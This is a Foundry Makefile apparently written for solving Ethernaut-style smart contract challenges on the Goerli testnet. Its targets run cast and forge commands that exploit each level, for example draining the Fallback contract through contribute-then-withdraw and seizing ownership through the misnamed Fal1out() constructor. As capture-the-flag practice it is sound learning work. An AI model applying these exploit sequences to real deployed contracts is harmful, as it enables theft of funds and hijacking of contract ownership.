-include .env

.PHONY: all clean remove install update build attack-fallback attack-fallout attack-coinflip attack-telephone attack-token attack-delegation attack-force

help:
	@echo "Usage:"
	@echo "  make attack<-level>\n    example: make attack-fallback"

all: clean remove install update build

clean  :; forge clean

remove :; rm -rf .gitmodules && rm -rf .git/modules/* && rm -rf lib && touch .gitmodules && git add . && git commit -m "modules"

install :; forge install OpenZeppelin/openzeppelin-contracts --no-commit && forge install foundry-rs/forge-std@v1.5.3 --no-commit

update:; forge update

build:; forge build

attack-fallback :
	@cast send $(FALLBACK_CONTRACT_ADDRESS) "contribute()" --value 0.0001ether --rpc-url $(GOERLI_RPC_URL) --private-key $(GOERLI_PRIVATE_KEY) && cast send $(FALLBACK_CONTRACT_ADDRESS) --value 0.0001ether --rpc-url $(GOERLI_RPC_URL) --private-key $(GOERLI_PRIVATE_KEY) && cast send $(FALLBACK_CONTRACT_ADDRESS) "withdraw()" --rpc-url $(GOERLI_RPC_URL) --private-key $(GOERLI_PRIVATE_KEY)

attack-fallout :
	@cast send $(FALLOUT_CONTRACT_ADDRESS) "Fal1out()" --rpc-url $(GOERLI_RPC_URL) --private-key $(GOERLI_PRIVATE_KEY)

attack-coinflip :
	@forge script script/interaction/InteractionCoinFlip.s.sol --sig "run(address)" $(COINFLIP_CONTRACT_ADDRESS) --rpc-url $(GOERLI_RPC_URL) --broadcast --private-key $(GOERLI_PRIVATE_KEY)

attack-telephone :
	@forge script script/interaction/InteractionTelephone.s.sol:ChangeOwnerTelephone --sig "run(address)" $(TELEPHONE_CONTRACT_ADDRESS) --rpc-url $(GOERLI_RPC_URL) --broadcast --private-key $(GOERLI_PRIVATE_KEY)

attack-token :
	@forge script script/interaction/InteractionToken.s.sol:TransferTokens --sig "run(address,address)" $(TOKEN_CONTRACT_ADDRESS) $(MY_ADDRESS)  --rpc-url $(GOERLI_RPC_URL) --broadcast --private-key $(GOERLI_PRIVATE_KEY)

attack-delegation :
	@forge script script/interaction/InteractionDelegation.s.sol --sig "run(address)" $(DELEGATION_CONTRACT_ADDRESS) --rpc-url $(GOERLI_RPC_URL) --broadcast --private-key $(GOERLI_PRIVATE_KEY)

attack-force :
	@forge script script/interaction/InteractionForce.s.sol --sig "run(address)" $(FORCE_CONTRACT_ADDRESS) --rpc-url $(GOERLI_RPC_URL) --broadcast --private-key $(GOERLI_PRIVATE_KEY)